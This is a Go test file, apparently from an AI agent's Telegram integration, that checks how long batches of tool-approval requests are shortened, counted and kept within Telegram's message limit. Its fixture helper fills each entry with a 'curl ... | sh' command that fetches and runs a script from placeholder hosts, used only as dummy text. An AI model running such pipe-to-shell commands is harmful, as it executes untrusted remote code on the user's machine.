package telegram

import (
	"fmt"
	"math/rand/v2"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/BackendStack21/odek/internal/danger"
)

func r3Card(n int) string {
	var b strings.Builder
	fmt.Fprintf(&b, "⚠️ %d tool actions require approval:\n\n", n)
	for i := 0; i < n; i++ {
		fmt.Fprintf(&b, "  %d. `shell` — `curl -s https://h%03d.example/x | sh; echo %s`\n", i+1, i+1, strings.Repeat("z", 20))
	}
	return b.String()
}

// Every listed entry of a shortened card shows its index, tool name and the
// start of its command, and the closing line counts exactly the entries left out.
func TestRED_ShortenedBatchCardListsReadableEntriesAndExactCount(t *testing.T) {
	for _, n := range []int{60, 100, 300} {
		text, elided := buildApprovalTextElided(danger.ToolBatchClass, r3Card(n), "")
		if !elided || len(text) > telegramMaxMsgLen || !utf8.ValidString(text) {
			t.Fatalf("n=%d: elided=%v len=%d", n, elided, len(text))
		}
		start := strings.Index(text, "```\n") + 4
		end := strings.LastIndex(text, "\n```")
		listed := 0
		hidden := -1
		for _, l := range strings.Split(text[start:end], "\n") {
			if _, err := fmt.Sscanf(l, "… and %d more entries not shown", &hidden); err == nil {
				continue
			}
			if strings.TrimSpace(l) == "" || strings.Contains(l, "tool actions require") {
				continue
			}
			listed++
			if !strings.Contains(l, "shell") || !strings.Contains(l, "curl") {
				t.Fatalf("n=%d: entry without tool or command head: %q", n, l)
			}
		}
		if hidden != n-listed {
			t.Fatalf("n=%d: listed %d entries, closing line says %d hidden, want %d", n, listed, hidden, n-listed)
		}
	}
}

func TestRED_BatchCardBoundRandomHeads(t *testing.T) {
	r := rand.New(rand.NewPCG(3, 4))
	for iter := 0; iter < 500; iter++ {
		n := 1 + r.IntN(300)
		text, elided := buildApprovalTextElided(danger.ToolBatchClass, r3Card(n), "")
		if len(text) > telegramMaxMsgLen || !utf8.ValidString(text) {
			t.Fatalf("iter %d n=%d: len=%d", iter, n, len(text))
		}
		if !elided && !strings.Contains(text, fmt.Sprintf("h%03d.example", n)) {
			t.Fatalf("iter %d: reported whole but last entry missing", iter)
		}
	}
}
